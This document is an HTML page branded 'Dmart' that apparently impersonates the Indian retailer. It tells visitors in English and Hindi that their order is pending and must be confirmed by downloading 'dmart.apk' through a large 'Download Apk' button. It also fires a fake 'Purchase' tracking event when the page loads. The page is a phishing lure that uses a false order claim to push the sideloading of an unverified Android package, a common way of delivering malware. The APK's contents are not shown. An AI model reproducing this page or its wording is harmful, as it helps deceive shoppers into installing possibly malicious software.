
<!doctype html>
<html lang="en" class="loading">
<head>
    <title>Dmart</title>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

    <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Mukta:300,400,700"> 
    <link rel="stylesheet" href="#/assets/front/fonts/icomoon/style.css">

    <link rel="stylesheet" href="../includes/bootstrap.min.css">
    <link rel="stylesheet" href="../includes/magnific-popup.css">
    <link rel="stylesheet" href="../includes/jquery-ui.css">
    <link rel="stylesheet" href="../includes/owl.carousel.min.css">
    <link rel="stylesheet" href="../includes/owl.theme.default.min.css">

    <!-- BEGIN: Toastr CSS-->
    <link rel="stylesheet" type="text/css" href="../includes/toastr.css">
    <link rel="stylesheet" type="text/css" href="../includes/toastr.css">
    
    <link href="https://cdn.jsdelivr.net/npm/bootstrap-icons/font/bootstrap-icons.css" rel="stylesheet">
    <!-- END: Toastr CSS-->

    <link rel="stylesheet" href="../includes/aos.css">

    <link rel="stylesheet" href="../includes/style.css">
    <meta name="csrf-token" content="vrfYMuF6CRXVHTOXXGW1gfUv1gFUUbOgc3WPLKKB">
    <style type="text/css">

    /* Slideshow container */
    .slideshow-container {
      max-width: 100%;
      position: relative;
      margin: auto;
      max-height: 50%;
    }

    /* Number text (1/3 etc) */
    .numbertext {
      color: #f2f2f2;
      font-size: 12px;
      padding: 8px 12px;
      position: absolute;
      top: 0;
    }

    @keyframes  fade {
      from {opacity: .4} 
      to {opacity: 1}
    }
    .header_space {
        width: 100%;
        height: 90px;
    }
    .site-blocks-table tbody tr:first-child td {
        border-top: none !important;
    }
    .head img {
        width: 100%;
        height: auto;
    }
    
    .carousel-control-next-icon, .carousel-control-prev-icon {
        width: 30px;
        height: 30px;
        filter: drop-shadow(2px 4px 6px black);
    }
    .carousel-indicators li {
        width: 30px;
        filter: drop-shadow(2px 4px 6px black);
    }
    </style>
        <script>
        fbq('track', 'Purchase');
    </script>
    <style type="text/css">
        @media  only screen and (max-width: 600px) {

            .slideshow-container,
            .carousel {
                display: none;
            }
        }
    </style>
    
<!-- Meta Pixel Code -->
<script>
!function(f,b,e,v,n,t,s)
{if(f.fbq)return;n=f.fbq=function(){n.callMethod?
n.callMethod.apply(n,arguments):n.queue.push(arguments)};
if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';
n.queue=[];t=b.createElement(e);t.async=!0;
t.src=v;s=b.getElementsByTagName(e)[0];
s.parentNode.insertBefore(t,s)}(window, document,'script',
'https://connect.facebook.net/en_US/fbevents.js');
fbq('init', '3606660602953287');
fbq('track', 'PageView');
fbq('track', 'Purchase', {
  value: 100.00,
  currency: 'INR'
});
</script>
<noscript><img height="1" width="1" style="display:none"
src="https://www.facebook.com/tr?id=3606660602953287&ev=PageView&noscript=1"
/></noscript>
<!-- End Meta Pixel Code -->



    <style>
        @keyframes  swing {
            0% {
                transform: rotate(0deg);
            }

            25% {
                transform: rotate(10deg);
            }

            50% {
                transform: rotate(-5deg);
            }

            75% {
                transform: rotate(5deg);
            }

            100% {
                transform: rotate(0deg);
            }
        }

        #popup {
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            z-index: 9999;
            animation: swing 1s ease infinite;
        }
    </style>
            
    <link href="https://cdn.jsdelivr.net/npm/bootstrap-icons/font/bootstrap-icons.css" rel="stylesheet">




</head>
<body>
    <div class="site-wrap">
    <!--<a href="#">-->
    <!--    <div class="head">-->
    <!--        <img src="../includes/head.jpg" alt="">-->
    <!--    </div>-->
    <!--</a>-->
    <header class="site-navbar" role="banner">
        <div class="site-navbar-top">
            <div class="container">
                <div class="row align-items-center">

                    <div class="col-6 col-md-4 order-2 order-md-1 site-search-icon text-left">
                        <div class="">
                            <a href="#" class="js-logo-clone">
                                <img src="../includes/logo.png" style="max-width: 43% !important;"
                                    alt="Image placeholder" class="img-fluid">
                            </a>
                        </div>
                    </div>

                    <div class="col-6 col-md-4 order-3 order-md-3 text-right">
                        <div class="site-top-icons">
                            <ul>
                                <li>
                                    <img src="../includes/shopping-cart (1).png" alt=""
                                        style="width: 25px;height:25px">
                                </li>
                                <li>
                            </ul>
                        </div>
                    </div>

                </div>
            </div>
        </div>
    </header>
    <div class="header_space"></div>
    <div id="carouselExampleIndicators" class="carousel slide px-2" data-ride="carousel">
        <ol class="carousel-indicators">
            <li data-target="#carouselExampleIndicators" data-slide-to="0" class="active"></li>
            <li data-target="#carouselExampleIndicators" data-slide-to="1"></li>
        </ol>
        <div class="carousel-inner">
            <div class="carousel-item active">
                <img class="d-block w-100" src="../includes/slider1.webp" alt="First slide"
                    style="width:100%; height: 50%">
            </div>
            <div class="carousel-item">
                <img class="d-block w-100" src="../includes/slider2.webp" alt="Second slide"
                    style="width:100%; height: 50%">
            </div>
            <div class="carousel-item">
                <img class="d-block w-100" src="../includes/slider3.webp" alt="Three slide"
                    style="width:100%; height: 50%">
            </div>
        </div>
        <a class="carousel-control-prev" href="#carouselExampleIndicators" role="button" data-slide="prev">
            <span class="carousel-control-prev-icon" aria-hidden="true"></span>
            <span class="sr-only">Previous</span>
        </a>
        <a class="carousel-control-next" href="#carouselExampleIndicators" role="button" data-slide="next">
            <span class="carousel-control-next-icon" aria-hidden="true"></span>
            <span class="sr-only">Next</span>
        </a>
    </div>

        <div class="site-section p-0">
        <div class="container">
            <div class="mt-4" style="max-width: 400px;">

                <div class="text-center" style="border-radius: 8px;">
                    <i class="bi bi-check-circle" style="font-size: 2em; color: #216a32;"></i>


                    <h4 class="fw-medium mb-3 fs-5 text-black" style='font-weight:600'>Please Confirm!</h4>
                    <p class="text-dark" style='font-weight:600'>Thank you for visiting us and making your first purchase! Your Order is Still Pending Kindly Download Our App and Confirm Your Order. We look forward to seeing you again.

                    </p>
                    <p class="text-capitalize text-black"> <span
                            style='font-weight:600;font-size:16px'>
                            </span style='font-weight:600;font-size:16px'></span>
                    आपका ऑर्डर अभी भी पेंडिग है, कृपया हमारा ऐप डाउनलोड करें और अपने ऑर्डर की पुष्टि करें।
                    </p>
                    <div class="text-center">
                        <img src="../includes/down-arrow.png" class="img-fluid "
                            style="height: 30px; color:white;" alt="">
                    </div>
                    
                    <a class="btn mt-2 w-100" href="dmart.apk" download style="background-color: #216a32; color:white">
                        <i class="bi bi-android2"></i>
                        Download Apk</a>
                    <p class="mt-1 fs-8 text-black" style="font-weight:500;">It's our way of saying thanks for joining our family.</p>

                </div>
            </div>
            
        </div>
    </div>
    <!-- BEGIN: Footer-->
    <footer class="site-footer border-top" style="margin-bottom:80px">
    <div class="container">
        <div class="row text-center">
            <div class="col-md-12">
                
                <img src="../includes/footer-img.png" style="max-width:360px" alt="">
            </div>

        </div>
    </div>
</footer>
    <script src="../includes/jquery-3.3.1.min.js"></script>
    <script src="../includes/jquery-ui.js"></script>
    <script src="../includes/popper.min.js"></script>
    <script src="../includes/bootstrap.min.js"></script>
    <script src="../includes/owl.carousel.min.js"></script>
    <script src="../includes/jquery.magnific-popup.min.js"></script>
    <script src="../includes/aos.js"></script>
    <script src="../includes/main.js"></script>
    <!-- Toastr -->
    <script src="../includes/toastr.min.js"></script>
    <script src="../includes/toastr.js"></script>
    <script src="https://cdn.jsdelivr.net/npm/jquery-validation@1.19.5/dist/jquery.validate.min.js"></script>
            
    <script>
      let slideIndex = 0;
      showSlides();

      function showSlides() {
        let i;
        let slides = document.getElementsByClassName("mySlides");
        for (i = 0; i < slides.length; i++) {
          slides[i].style.display = "none";
        }
        slideIndex++;
        if (slideIndex > slides.length) {slideIndex = 1}
        slides[slideIndex-1].style.display = "block";
        setTimeout(showSlides, 5000); // Change image every 2 seconds
      }
    </script>
</body>
</html>